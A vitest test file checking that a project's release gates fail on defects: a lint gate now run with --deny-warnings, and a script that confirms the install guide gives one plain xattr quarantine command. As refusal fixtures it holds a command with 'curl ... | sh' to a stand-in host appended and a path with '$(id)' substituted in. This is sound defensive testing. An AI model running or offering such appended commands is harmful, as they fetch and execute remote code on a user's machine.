// Whether the release gates can say no, which is the only thing a gate is for.
//
// The smoke test spent three releases asserting nothing — it opened a window
// onto a renderer with no runtime behind it, the window said "Could not reach
// the runtime", and the gate passed because a window had opened. Finding that
// is a reason to ask the same question of the others rather than to assume they
// are different, and two of them answered badly.
//
// `npm run lint` could not fail. oxlint reports every rule it has, the
// correctness ones included, at warning severity and exits 0 unless told
// otherwise; a duplicate object key planted in src/shared/theme.ts was printed
// by the gate and the gate passed. Twenty-eight warnings were standing in the
// tree while it did.
//
// `scripts/verify-quarantine-advice.mjs` could not see half the document it
// checks. It reads the quarantine command out of `docs/install.md` and refuses
// when the document gives more than one spelling of it — because two copies of
// one instruction is exactly where one gets fixed and the other does not. Its
// fence pattern accepted three info strings, `docs/install.md` had grown a
// fourth, and from that fence down every block was paired with the wrong
// partner: a second, contradicting command anywhere in the lower half of the
// document was invisible to the refusal written to catch it.
//
// So each test here is a defect first. Nothing below asserts that a gate passes
// on a healthy tree — that is what running it proves. What is asserted is that
// it stops on a broken one.
import { spawnSync } from 'node:child_process'
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'

const REPO_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..')
const PACKAGE = JSON.parse(readFileSync(join(REPO_ROOT, 'package.json'), 'utf8')) as {
  scripts: Record<string, string>
}

let scratch = ''
beforeAll(() => {
  scratch = mkdtempSync(join(tmpdir(), 'teamree-gates-'))
})
afterAll(() => {
  rmSync(scratch, { recursive: true, force: true })
})

/** Writes `contents` to a file in the scratch directory and returns its path. */
function fixture(name: string, contents: string): string {
  const path = join(scratch, name)
  writeFileSync(path, contents)
  return path
}

// ------------------------------------------------------------- the linter --

describe('the lint gate', () => {
  // A file oxlint has an opinion about under any configuration: `no-dupe-keys`
  // is a correctness rule, and a duplicate key is a defect in anybody's book.
  const OFFENDING = 'export const wrong = { a: 1, a: 2 }\n'

  function oxlint(flags: string[], target: string) {
    return spawnSync('npx', ['oxlint', ...flags, target], { cwd: REPO_ROOT, encoding: 'utf8' })
  }

  // The discovery, kept as a test so the assertion below is not an arbitrary
  // string check against package.json. Without the flag oxlint prints the
  // defect and exits 0, which is the whole of what was wrong with this gate.
  it('would pass a defect it has found and printed, if warnings were not denied', () => {
    const target = fixture('unflagged.ts', OFFENDING)
    const result = oxlint(['-c', '.oxlintrc.json'], target)
    expect(result.stdout + result.stderr).toContain('no-dupe-keys')
    expect(result.status).toBe(0)
  })

  it('refuses the same defect once they are', () => {
    const target = fixture('flagged.ts', OFFENDING)
    expect(oxlint(['-c', '.oxlintrc.json', '--deny-warnings'], target).status).not.toBe(0)
  })

  // Two rules are turned off in .oxlintrc.json, both because this codebase
  // breaks them deliberately. Turning rules off is how a gate goes quiet, so
  // what is asserted is that the ones that are left still bite.
  it('still has the rest of its rules after the two this project turns off', () => {
    const target = fixture('unreachable.ts', 'export function f() {\n  return 1\n  return 2\n}\n')
    const result = oxlint(['-c', '.oxlintrc.json', '--deny-warnings'], target)
    expect(result.stdout + result.stderr).toContain('no-unreachable')
    expect(result.status).not.toBe(0)
  })

  it('is run by the gate that way, and not the way that could not fail', () => {
    expect(PACKAGE.scripts.lint).toMatch(/--deny-warnings|--max-warnings[= ]0/)
  })
})

// ------------------------------------------------- the quarantine advice --

describe('the check on the one command every first user is given', () => {
  const SCRIPT = join(REPO_ROOT, 'scripts', 'verify-quarantine-advice.mjs')
  const RIGHT = 'xattr -dr com.apple.quarantine /Applications/teamree.app'

  /**
   * Runs the check against a document of our own.
   *
   * Against a fixture rather than against `docs/install.md`, because the
   * alternative is a test that edits the real document underneath whoever is
   * running it — and the document is the thing being protected.
   */
  function check(markdown: string) {
    const doc = fixture(`install-${Math.random().toString(36).slice(2, 8)}.md`, markdown)
    const result = spawnSync(process.execPath, [SCRIPT, doc], { cwd: REPO_ROOT, encoding: 'utf8' })
    return { status: result.status, output: `${result.stdout}${result.stderr}` }
  }

  const document = (...blocks: string[]) =>
    ['# Installing', '', 'Some prose.', '', ...blocks.flatMap((block) => ['```sh', block, '```', ''])].join('\n')

  it('reads the command the document actually gives', () => {
    const result = check(document(RIGHT))
    expect(result.output).toContain(`read the advice out of`)
    expect(result.output).toContain(RIGHT)
    // Not the exit status: on macOS the run carries on into a real bundle and a
    // real Gatekeeper, and this test is about the half that reads text.
    expect(result.output).toContain('the release notes print the same command')
  })

  it('refuses a document that has stopped giving one at all', () => {
    const result = check(document('open /Applications/teamree.app'))
    expect(result.status).toBe(1)
    expect(result.output).toContain('no longer gives a command for com.apple.quarantine')
  })

  it('refuses a command that disagrees with the one the release notes print', () => {
    const result = check(document('xattr -cr /Applications/teamree.app'))
    expect(result.status).toBe(1)
    expect(result.output).toContain('prints a different quarantine command')
  })

  it('refuses a command written against somewhere else, which it could not run verbatim', () => {
    const result = check(document('xattr -dr com.apple.quarantine ~/Downloads/teamree.app'))
    expect(result.status).toBe(1)
    expect(result.output).toContain('does not name /Applications/teamree.app')
  })

  it('refuses two spellings of the advice, which is how one of them rots unnoticed', () => {
    const result = check(document(RIGHT, 'xattr -cr /Applications/teamree.app'))
    expect(result.status).toBe(1)
    expect(result.output).toContain('2 different quarantine commands')
  })

  // What this block says is run through `/bin/sh` on whoever is cutting the
  // release, on a machine where this script has just installed an app at
  // `/Applications`. Anything appended to the documented command is executed
  // with it, and a pull request that only edits a document is read as prose.
  //
  // `agreesWithReleaseNotes` refuses this one too, because the release notes
  // print the bare command and this is no longer a substring of it — but that
  // is a check about two documents drifting apart, in another function, against
  // a literal in another file, and it would stop covering this the day somebody
  // reworded the notes. So the refusal asserted here is the one that names the
  // shell, which is the guarantee this test is for.
  it('refuses a block with a second command hung off the end of the advice', () => {
    const result = check(document(`${RIGHT} && curl -s http://example.invalid/x | sh`))
    expect(result.status).toBe(1)
    expect(result.output).toContain('not a single plain xattr invocation')
    expect(result.output).toContain('runs it through a shell')
  })

  it('refuses a block that is two lines, whatever the second one is', () => {
    const result = check(document(`${RIGHT}\necho hello`))
    expect(result.status).toBe(1)
    expect(result.output).toContain('not a single plain xattr invocation')
  })

  // The command substitution spelling, which has no operator in it at all and
  // is why the check is a character set rather than a list of operators.
  it('refuses a block that substitutes a command into the path', () => {
    const result = check(document('xattr -dr com.apple.quarantine /Applications/teamree.app$(id)'))
    expect(result.status).toBe(1)
    expect(result.output).toContain('not a single plain xattr invocation')
  })

  it('refuses a block that runs something else before xattr', () => {
    const result = check(document(`sudo ${RIGHT}`))
    expect(result.status).toBe(1)
    expect(result.output).toContain('not a single plain xattr invocation')
  })

  // The regression. `docs/install.md` carries a ```powershell block, and the
  // pattern that found the fenced blocks listed the info strings it would
  // accept: sh, bash, console, or none. An opening fence it could not match
  // left its own closing fence to be read as the next opening one, so every
  // block below it was paired with the wrong partner and the contents of the
  // lower half of the document were searched inside out. The second command
  // here sits under exactly such a fence, and used to be invisible.
  it('sees a second spelling below a fence whose language it does not know', () => {
    const result = check(
      [
        '# Installing',
        '',
        '```sh',
        RIGHT,
        '```',
        '',
        'And on some other machine:',
        '',
        '```powershell',
        'Get-Item .',
        '```',
        '',
        'And then:',
        '',
        '```sh',
        'xattr -cr /Applications/teamree.app',
        '```',
        ''
      ].join('\n')
    )
    expect(result.status).toBe(1)
    expect(result.output).toContain('2 different quarantine commands')
  })
})
